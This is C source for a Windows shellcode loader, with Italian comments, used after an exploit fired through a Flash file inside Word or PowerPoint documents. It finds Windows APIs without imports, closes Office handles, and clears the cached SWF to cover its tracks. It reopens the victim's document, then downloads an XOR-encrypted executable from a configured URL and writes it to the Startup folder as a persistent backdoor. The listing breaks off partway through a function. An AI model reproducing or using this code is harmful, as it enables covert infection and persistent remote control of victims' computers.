#include <Windows.h>
#include <Winternl.h>
#include <ShlObj.h>

#pragma section(".loader", read,execute)
#pragma code_seg(".loader")

#include "loader.h"
#include "crt.h"

 #pragma optimize( "", off )
__declspec(allocate(".loader"))
struct __strings _STRINGS =
{
	//NULL, NULL, 0x8f900864, // SHELLCODE gadget
	{ 'N', 'T', 'D', 'L', 'L', 0x00 },
	{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', 0x0 },
	{ 'u', 's', 'e', 'r', '3', '2', 0x0 },
	{ 's', 'h', 'e', 'l', 'l', '3', '2', 0x0 },
	{ 'U', 'R', 'L', 'M', 'O', 'N', 0x00 },
	{ 'W', 'I', 'N', 'I', 'N', 'E', 'T', 0x0 },
	{ 'A', 'D', 'V', 'A', 'P', 'I', '3', '2', 0x0 },

	{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 },
	{ 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x0 },
	{ 'S', 'l', 'e', 'e', 'p', 0x0 },
	{ 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 },
	{ 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'W', 0x0 },
	{ 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'F', 'i', 'l', 'e', 0x0 },
	{ 'S', 'h', 'e', 'l', 'l', 'E', 'x', 'e', 'c', 'u', 't', 'e', 'W', 0x0 },
	{ 'U', 'R', 'L', 'D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', 'T', 'o', 'F', 'i', 'l', 'e', 'A', 0x00 },
	{ 'S', 'H', 'G', 'e', 't', 'S', 'p', 'e', 'c', 'i', 'a', 'l', 'F', 'o', 'l', 'd', 'e', 'r', 'P', 'a', 't', 'h', 'W', 0x00 },
	{ 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', 0x0 },
	{ 'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', 0x0 },
	{ 'D', 'e', 'l', 'e', 't', 'e', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', 0x0 },
	{ 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 0x0 },
	{ 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'O', 'b', 'j', 'e', 'c', 't', 0x0 },
	{ 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 },
	{ 'G', 'e', 't', 'S', 'h', 'o', 'r', 't', 'P', 'a', 't', 'h', 'N', 'a', 'm', 'e', 'W', 0x0},
	{ 'G', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'W', 0x0 },
	{ 'R', 'e', 'g', 'O', 'p', 'e', 'n', 'K', 'e', 'y', 'E', 'x', 'W', 0x0 },
	{ 'R', 'e', 'g', 'Q', 'u', 'e', 'r', 'y', 'V', 'a', 'l', 'u', 'e', 'E', 'x', 'W', 0x0 },
	{ 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 },
	{ 'G', 'e', 't', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'I', 'n', 'f', 'o', 'A', 0x0 },
	{ 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'A', 0x0 },
	{ 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'O', 'p', 'e', 'n', 'U', 'r', 'l', 'A', 0x0 },
	{ 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'A', 0x0 },
	{ 'I', 'n', 't', 'e', 'r', 'n', 'e', 't', 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 'E', 'x', 'A', 0x0 }, 
	{ 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 },
	{ 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 },
	{ 'a', 't', 'o', 'i', 0x0 },
	{ 'w', 'c', 's', 't', 'o', 'm', 'b', 's', 0x0 },

	{ L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'O', L'f', L'f', L'i', L'c', L'e', L'\\', L'\0' },
	{ L'W', L'o', L'r', L'd', L'\0' },
	{ L'P', L'o', L'w', L'e', L'r', L'P', L'o', L'i', L'n', L't', L'\0' },

	{ L'\\', L'F', L'i', L'l', L'e', L' ', L'M', L'R', L'U', L'\0' },
	{ L'I', L't', L'e', L'm', L' ', L'1', L'\0' },

	{ '.', 's', 'w', 'f', 0x0 },

	{ L'P', L'r', L'i', L'm', L'a', L'r', L'y', L'W', L'o', L'r', L'd', L'1', L'\0' },
	{ L'M', L'u', L't', L'e', L'x', L'\0' },
	{ L'\\', L'P', L'P', L'1', 0x0 },
	{ L'R', L'u', L'n', L'n', L'i', L'n', L'g', 0x0 },


	{ L'.', L'D', L'O', L'C', L'X', L'\0' },
	{ L'.', L'P', L'P', L'S', L'X', L'\0' },

	{ L'/', L'q', L' ', L'/', L'f', L' ', L'"', L'\0' },
	{ L'/', L's', L' ', L'"', L'\0' },

	{ L'\\', L'~', L'$', L'\0' },
	{ L'"', L'\0' },

	{ 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '4', '.', '0', ' ', '(', 'c', 'o', 'm', 'p', 'a', 't', 'i', 'b', 'l', 'e', ';', ' ', 'M', 'S', 'I', 'E', ' ', '7', '.', '0', ';', ' ', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '6', '.', '1', ';', ' ', 'W', 'O', 'W', '6', '4', ';', ' ', 'T', 'r', 'i', 'd', 'e', 'n', 't', '/', '5', '.', '0', ';', ' ', 'S', 'L', 'C', 'C', '2', ';', ' ', '.', 'N', 'E', 'T', ' ', 'C', 'L', 'R', ' ', '2', '.', '0', '.', '5', '0', '7', '2', '7', ';', ' ', '.', 'N', 'E', 'T', ' ', 'C', 'L', 'R', ' ', '3', '.', '5', '.', '3', '0', '7', '2', '9', ';', ' ', '.', 'N', 'E', 'T', ' ', 'C', 'L', 'R', ' ', '3', '.', '0', '.', '3', '0', '7', '2', '9', ';', ' ', 'M', 'e', 'd', 'i', 'a', ' ', 'C', 'e', 'n', 't', 'e', 'r', ' ', 'P', 'C', ' ', '6', '.', '0', ';', ' ', '.', 'N', 'E', 'T', '4', '.', '0', 'C', ';', ' ', '.', 'N', 'E', 'T', '4', '.', '0', 'E', ';', ' ', 'M', 'D', 'D', 'R', 'J', 'S', ')', 0x0 }
};

__declspec(allocate(".loader"))
 struct __config _CONFIG = 
{
	0x41414141,
	{ 'h', 't', 't', 'p', ':', '/', '/', '1', '9', '2', '.', '1', '6', '8', '.', '8', 
	'.', '1', ':', '8', '0', '8', '0', '/', 't', 'r', 'o', 'j', 'a', 'n', '.', 'e', 
	'x', 'e', 0x00, 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	0x00, 0x00, 0x00, 0x00 },
	{ '\\', 'b', 'a', 'd', 'l', 'l', '.', 'e', 'x', 'e', 0x00, 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 
	0x00, 0x00, 0x00, 0x00 },
};

__declspec(allocate(".loader")) 
VTABLE vTable =
{
	NULL, NULL, (OUTPUTDEBUGSTRINGA)0x8f900864, // SHELLCODE gadget
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

__declspec(naked) VOID Startup()
{
	_asm 
	{
		// make sure the next call is 4-byte aligned in the shellcode.
		nop
		nop
		nop
start:
		call next			// shellcode gadget, non toccare
next:
		pop eax				// shellcode gadget
		and eax, 0xfffff000 // shellcode gadget

		sub eax, 0x1000		// occhio che qui deve esserci > 4096 tra lo stub e e stringhe
		lea esi, vTable
		and esi, 0x00000fff
		add esi, eax

		lea edi, _CONFIG
		and edi, 0x00000fff
		add edi, eax

		lea ecx, _STRINGS
		and ecx, 0x00000fff
		add ecx, eax

		add ecx, 0x40
		add edi, 0x40
		add esi, 0x40
		push ecx
		push edi
		push esi
		call LoaderEntryPoint
	}
}

VOID RemoveCachedObject(__in PVTABLE lpTable, __in LPSTR strUrl, __in BOOL isSubString)
{
	DWORD dwLen = 0x1000;
	LPINTERNET_CACHE_ENTRY_INFOA lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFOA) lpTable->VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

	if (!isSubString)
	{
		BOOL dwRet = lpTable->GetUrlCacheEntryInfoA(strUrl, lpCacheEntry, &dwLen);
		if (!dwRet)
		{
			lpTable->Sleep(1000);
			dwRet = lpTable->GetUrlCacheEntryInfoA(strUrl, lpCacheEntry, &dwLen);
		}

		if (!lpTable->DeleteUrlCacheEntryA(strUrl))
			lpTable->DeleteUrlCacheEntryA(strUrl);

		if (dwRet)
			lpTable->DeleteFileA(lpCacheEntry->lpszLocalFileName);
		
		return;
	}

	dwLen = 0x1000;
	HANDLE hCache = lpTable->FindFirstUrlCacheEntryA(NULL, lpCacheEntry, &dwLen);
	if (hCache == NULL)
		return;
	do
	{
		if (__STRSTRI__(lpCacheEntry->lpszSourceUrlName, strUrl))
		{
			if (!lpTable->DeleteUrlCacheEntryA(lpCacheEntry->lpszSourceUrlName))
				lpTable->DeleteUrlCacheEntryA(lpCacheEntry->lpszSourceUrlName);

			lpTable->DeleteFileA(lpCacheEntry->lpszLocalFileName);
		}
	
		dwLen = 0x1000;
	}
	while (lpTable->FindNextUrlCacheEntryA(hCache, lpCacheEntry, &dwLen));

	lpTable->FindCloseUrlCache(hCache);
}

LPWSTR FindDriveOfFile(__in PVTABLE lpTable, __in struct __strings *strings, __in LPWSTR strFileName)
{
	LPWSTR strPath = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

	for (CHAR i='A'; i<='Z'; i++)
	{
		strPath[0] = i;
		strPath[1] = ':';
		strPath[2] = 0x0;
		__STRCATW__(strPath, strFileName);
	
		if (lpTable->GetFileAttributesW(strPath) != INVALID_FILE_ATTRIBUTES)
			return strPath;
	}

	return NULL;
}

LPWSTR ReadMRU(__in PVTABLE lpTable, __in struct __strings *strings)
{
	HKEY hKey;
	DWORD dwType, dwSize;
	WCHAR strOfficeVer[5];
	LPWSTR strPath = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	LPWSTR strOfficeMRUKey = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

	for (UINT i=0x30; i<=0x35; i++)
	{
		strOfficeVer[0] = '1';
		strOfficeVer[1] = i;
		strOfficeVer[2] = '.';
		strOfficeVer[3] = '0';
		strOfficeVer[4] = 0x0;
		
		strOfficeMRUKey[0] = 0x0;

		__STRCATW__(strOfficeMRUKey, strings->strOfficeKey1);
		__STRCATW__(strOfficeMRUKey, strOfficeVer);
#ifdef DOCX
		__STRCATW__(strOfficeMRUKey, strings->strWord);
#elif PPSX
		__STRCATW__(strOfficeMRUKey, strings->strPowerPoint);
#endif
		__STRCATW__(strOfficeMRUKey, strings->strOfficeKey2);
	
		if (lpTable->RegOpenKeyExA(HKEY_CURRENT_USER, strOfficeMRUKey, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
		{
			dwSize = 0x1000;
	
			if (lpTable->RegQueryValueExA(hKey, strings->strOfficeItem, NULL, &dwType, strPath, &dwSize) == ERROR_SUCCESS)
			{
				while (*strPath++ != ':');

				strPath -= 2;
				return strPath;
			}
		}
	}

	return NULL;
}

LPSTR GetStartupPath(__in PVTABLE lpTable)
{
	LPSTR strStartupPath = (LPSTR) lpTable->VirtualAlloc(NULL, 0x8000, MEM_COMMIT, PAGE_READWRITE);
	LPWSTR wstrLongPath = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	LPWSTR wstrShortPath = (LPWSTR) lpTable->VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

	if (!lpTable->SHGetSpecialFolderPathW(NULL, wstrLongPath, CSIDL_STARTUP, TRUE))
		lpTable->SHGetSpecialFolderPathW(NULL, wstrLongPath, CSIDL_STARTUP, FALSE);

	lpTable->GetShortPathNameW(wstrLongPath, wstrShortPath, 0x8000);
	lpTable->wcstombs(strStartupPath, wstrShortPath, 0x8000);

	return strStartupPath;
}


VOID LoaderEntryPoint(struct __vtbl *VTBL, struct __config *config, struct __strings *strings)
{ 
	DWORD dwOut;
	VTABLE lpTable;

	if (!GetVTable(&lpTable, strings))
		return; // FIXME

	IO_STATUS_BLOCK pIO;
	PFILE_NAME_INFORMATION lpFileNameInfo = (PFILE_NAME_INFORMATION) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	PFILE_NAME_INFORMATION lpEventNameInfo = (PFILE_NAME_INFORMATION) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

	BOOL dwOriginalFileFound = FALSE;
	BOOL dwEventClosed = FALSE;
	HANDLE hTmpFile = INVALID_HANDLE_VALUE;

	for (UINT i=0; i<0xffff; i++)
	{		
		if (dwOriginalFileFound == FALSE)
		{
			__MEMSET__(lpEventNameInfo, 0x0, 0x1000);
			if (dwEventClosed == FALSE && lpTable.NtQueryObject((HANDLE)i, (OBJECT_INFORMATION_CLASS)1, lpEventNameInfo, 0x1000, &dwOut) == 0)
			{
#ifdef DOCX
				if (lpEventNameInfo->FileNameLength > 0 && __STRSTRIW__(lpEventNameInfo->FileName, strings->strDOCRunning) && __STRSTRIW__(lpEventNameInfo->FileName, strings->strDOCRunning2))	
#elif PPSX
				if (lpEventNameInfo->FileNameLength > 0 && __STRSTRIW__(lpEventNameInfo->FileName, strings->strPPRunning1) && __STRSTRIW__(lpEventNameInfo->FileName, strings->strPPRunning2))	
#endif
				{
					lpTable.CloseHandle((HANDLE)i); // chiude handle a ***PrimaryWord1*Mutex
					dwEventClosed = TRUE;
				}
			}

			DWORD dwHighSize = 0;
			DWORD dwLowSize = lpTable.GetFileSize((HANDLE)i, &dwHighSize); // ha una size ?
			if (dwLowSize == INVALID_FILE_SIZE)
				continue;

			__MEMSET__(lpFileNameInfo, 0x0, 0x1000);
			if (lpTable.NtQueryInformationFile((HANDLE)i, &pIO, lpFileNameInfo, 0x1000, (FILE_INFORMATION_CLASS)9)) // ha un nome?
				continue;
#ifdef DOCX
			if (!__STRSTRIW__(lpFileNameInfo->FileName, strings->strDOCX)) // .docx?
				continue;
#elif PPSX
			if (!__STRSTRIW__(lpFileNameInfo->FileName, strings->strPPSX)) // .ppsx?
				continue;
#endif
			if (__STRSTRIW__(lpFileNameInfo->FileName, strings->strTmp)) // != temp file
			{
				hTmpFile = (HANDLE) i;
				continue;
			}
	
			lpTable.CloseHandle((HANDLE)i);
			dwOriginalFileFound = TRUE;
		}

		if (dwOriginalFileFound && dwEventClosed)
			break;

	}
	if (hTmpFile != INVALID_HANDLE_VALUE)
		lpTable.CloseHandle(hTmpFile);	

	// prima di lanciare la nuova istanza, zapppiamo l'swf dalla cache cosi' non va in loop mortale ritriggherando l'exploit
	lpTable.Sleep(500);
	RemoveCachedObject(&lpTable, strings->strSWFSuffix, TRUE);


	// cerca di recuperare il path completo del documento originale
	LPWSTR strCompleteDocumentPath = NULL;
	if (dwOriginalFileFound)
		strCompleteDocumentPath = FindDriveOfFile(&lpTable, strings, lpFileNameInfo->FileName);
	else
		strCompleteDocumentPath = ReadMRU(&lpTable, strings);
	

	// prepara gli argomenti per la ShellExecute
	LPWSTR strArgs = (LPWSTR) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	__MEMSET__(strArgs, 0x0, 0x1000);
	if (strCompleteDocumentPath != NULL)
	{
#ifdef DOCX
		__STRCATW__(strArgs, strings->strDOCArgs);
#elif PPSX
		__STRCATW__(strArgs, strings->strPPTArgs);
#endif
		__STRCATW__(strArgs, strCompleteDocumentPath);
		__STRCATW__(strArgs, strings->strQuote);
	}
	
	// lancia office
	LPWSTR strExe = (LPWSTR) lpTable.VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	lpTable.GetModuleFileNameW(NULL, strExe, 0x1000);
	if (strCompleteDocumentPath != NULL)
		lpTable.ShellExecuteW(NULL, NULL, strExe, strArgs, NULL, 1);
	else
		lpTable.ShellExecuteW(NULL, NULL, strExe, NULL, NULL, 1);


	// download exe
	// dest path
	LPSTR strShortPath = GetStartupPath(&lpTable);
	__STRCAT__(strShortPath, config->szBackdoorPath);
	/*
	lpTable.SHGetSpecialFolderPathA(NULL, strStartupPath, CSIDL_STARTUP, TRUE);
	lpTable.GetShortPathNameA(strStartupPath, strShortPath, 0x1000/sizeof(WCHAR));
	
	*/

	DWORD dwFileSize = 0;
	LPBYTE lpFileBuffer = DownloadAndDecrypt(&lpTable, strings, config->szUrl, &dwFileSize, config->dwXorKey);
	if (lpFileBuffer != NULL)
	{
		HANDLE hFile = lpTable.CreateFileA(strShortPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			lpTable.WriteFile(hFile, lpFileBuffer, dwFileSize, &dwOut, NULL);
			lpTable.CloseHandle(hFile);
		}
	}

	//lpTable.URLDownloadToFileA(NULL, config->szUrl, strShortPath, NULL, NULL);

	// cancella ancora l'swf dalla cache, in caso non abbia fatto tempo a scriverlo nella cache prima.
	RemoveCachedObject(&lpTable, strings->strSWFSuffix, TRUE);

	// exits
	lpTable.Sleep(1000);
	lpTable.ExitProcess(0);
}

BOOL GetVTable(__out PVTABLE lpTable, struct __strings *_strings)
{
	
	if (!GetPointers(&lpTable->GetProcAddress, &lpTable->LoadLibraryA))
		return FALSE; // FIXME

	// KERNEL32
	lpTable->VirtualAlloc = (VIRTUALALLOC) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strVirtualAlloc);
	lpTable->GetFileSize = (GETFILESIZE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetFileSize);
	lpTable->CloseHandle  = (CLOSEHANDLE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strCloseHandle);
	lpTable->Sleep  = (SLEEP) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strSleep);
	lpTable->ExitProcess = (EXITPROCESS) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strExitProcess);
	lpTable->GetModuleFileNameW = (GETMODULEFILENAMEW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetModuleFileNameW);
	lpTable->GetShortPathNameW = (GETSHORTPATHNAMEW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetShortPathNameW);
	lpTable->GetFileAttributesW = (GETFILEATTRIBUTESW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strGetFileAttributesW);
	lpTable->DeleteFileA = (DELETEFILEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strDeleteFileA);
	lpTable->CreateFileA = (CREATEFILEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strCreateFileA);
	lpTable->WriteFile = (WRITEFILE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strKernel32), _strings->strWriteFile);
	

	// NTDLL
	lpTable->NtQueryInformationFile = (NTQUERYINFORMATIONFILE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strNtDll), _strings->strZwQueryInformationFile);
	lpTable->NtQueryObject = (NTQUERYOBJECT) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strNtDll), _strings->strNtQueryObject);
	lpTable->atoi = (ATOI) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strNtDll), _strings->strAtoi);
	lpTable->wcstombs = (WCSTOMBS) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strNtDll), _strings->strWcsToMbs);

	// SHELL32
	lpTable->ShellExecuteW = (SHELLEXECUTEW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strShell32), _strings->strShellExecuteW);
	lpTable->SHGetSpecialFolderPathW = (SHGETSPECIALFOLDERPATHW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strShell32), _strings->strSHGetSpecialFolderPathW);

	// WININET
	lpTable->FindFirstUrlCacheEntryA = (FINDFIRSTURLCACHEENTRYA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strFindFirstUrlCacheEntryA);
	lpTable->FindNextUrlCacheEntryA = (FINDNEXTURLCACHEENTRYA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strFindNextUrlCacheEntryA);
	lpTable->DeleteUrlCacheEntryA = (DELETEURLCACHEENTRYA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strDeleteUrlCacheEntryA);
	lpTable->FindCloseUrlCache = (FINDCLOSEURLCACHE) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strFindCloseUrlCache);
	lpTable->GetUrlCacheEntryInfoA = (GETURLCACHEENTRYINFOA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strGetUrlCacheEntryInfoA);
	lpTable->InternetOpenA = (INTERNETOPENA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strInternetOpenA);
	lpTable->InternetOpenUrlA = (INTERNETOPENURLA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strInternetOpenUrlA);
	lpTable->HttpQueryInfoA = (HTTPQUERYINFOA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strHttpQueryInfoA);
	lpTable->InternetReadFileExA = (INTERNETREADFILEEXA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strWinInet), _strings->strInternetReadFileExA);

	// URLMON
	//lpTable->URLDownloadToFileA = (URLDOWNLOADTOFILEA) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strUrlMon), _strings->strUrlDownloadToFileA);


	// ADVAPI32
	lpTable->RegOpenKeyExA = (REGOPENKEYEXW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strAdvapi32), _strings->strRegOpenKeyExW);
	lpTable->RegQueryValueExA = (REGQUERYVALUEEXW) lpTable->GetProcAddress(lpTable->LoadLibraryA(_strings->strAdvapi32), _strings->strRegQueryValueExW);

	return TRUE;
}

LPBYTE DownloadAndDecrypt(__in PVTABLE lpTable, __in struct __strings *strings, __in LPSTR strUrl, __in LPDWORD dwFileLen, __in DWORD dwXorKey)
{
	CHAR strBuff[17];
	HINTERNET hInternet;
	DWORD dwBuffLen, dwIdx, dwOut;
	
	hInternet = lpTable->InternetOpenA(strings->strUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hUrl = lpTable->InternetOpenUrlA(hInternet, strUrl, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_PRAGMA_NOCACHE, NULL);
		if (hUrl)
		{
			dwBuffLen = 16;
			dwIdx = 0;

			lpTable->HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH, strBuff, &dwBuffLen, &dwIdx);

			*dwFileLen = lpTable->atoi(strBuff);
			LPBYTE lpFileBuffer = (LPBYTE) lpTable->VirtualAlloc(NULL, *dwFileLen, MEM_COMMIT, PAGE_READWRITE);			

			if (DownloadFile(lpTable, hUrl, lpFileBuffer, *dwFileLen))
				return Decrypt(lpFileBuffer, *dwFileLen, dwXorKey);
		}
	}

	return NULL;
}

BOOL DownloadFile(__in PVTABLE lpTable, __in HINTERNET hUrl, __in LPBYTE lpBuffer, __in DWORD dwBufferLen)
{
	DWORD dwOut, dwRead = 0;
	INTERNET_BUFFERSA pInternetBuff;

	__MEMSET__(&pInternetBuff, 0x0, sizeof(INTERNET_BUFFERSA));
	pInternetBuff.dwStructSize = sizeof(INTERNET_BUFFERS);
	pInternetBuff.Next = NULL;
	pInternetBuff.lpvBuffer = lpBuffer;
	pInternetBuff.dwBufferLength = dwBufferLen;

	if (lpTable->InternetReadFileExA(hUrl, &pInternetBuff, IRF_SYNC, NULL))
		if (pInternetBuff.dwBufferLength == dwBufferLen)
			return TRUE;

	return FALSE;
}

LPBYTE Decrypt(__in LPBYTE lpBuffer, __in DWORD dwBuffLen, __in DWORD dwXorKey)
{
	LPDWORD lpD = (LPDWORD) lpBuffer;
	LPBYTE lpB = (LPBYTE) lpBuffer;

	for (UINT i=0; i<dwBuffLen/4; i++)
		lpD[i] ^= dwXorKey;
	for (UINT i=dwBuffLen - (dwBuffLen%4); i<dwBuffLen; i++)
		lpB[i] ^= 0x41;

	return lpBuffer;
}

HANDLE GetKernel32Handle()
{
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
	PPEB lpPeb = (PPEB) __readfsdword(0x30);
	PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;	

#ifdef SUX_KERNEL32_HANDLE
	hKernel32 = 
		(CONTAINING_RECORD(pListEntry->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))->DllBase;
#elif defined FAST_KERNEL32_HANDLE
	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;
			PWCHAR strName = (pModEntry->FullDllName.Buffer + (dwLen/sizeof(WCHAR))) - 13;

			if (GetStringHash(strName, TRUE, 13) == 0x8fecdbff || GetStringHash(strName, TRUE, 13) == 0x6e2bcfd7)
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}
#else
	WCHAR strDllName[MAX_PATH];
	WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

	while (pListEntry != pListHead)
	{
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry->FullDllName.Length)
		{
			DWORD dwLen	= pModEntry->FullDllName.Length;

			__MEMCPY__(strDllName, pModEntry->FullDllName.Buffer, dwLen);
			strDllName[dwLen/sizeof(WCHAR)] = L'\0';

			if (__STRSTRIW__(strDllName, strKernel32))
			{
				hKernel32 = pModEntry->DllBase;
				break;
			}
		}
		pListEntry = pListEntry->Flink;
	}

#endif

	return hKernel32;
}

BOOL GetPointers(
	__out PGETPROCADDRESS fpGetProcAddress, 
	__out PLOADLIBRARYA fpLoadLibraryA)
{
	HANDLE hKernel32 = GetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE)
		return FALSE;

	LPBYTE lpBaseAddr = (LPBYTE) hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER) lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) (lpBaseAddr +  pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfFunctions);
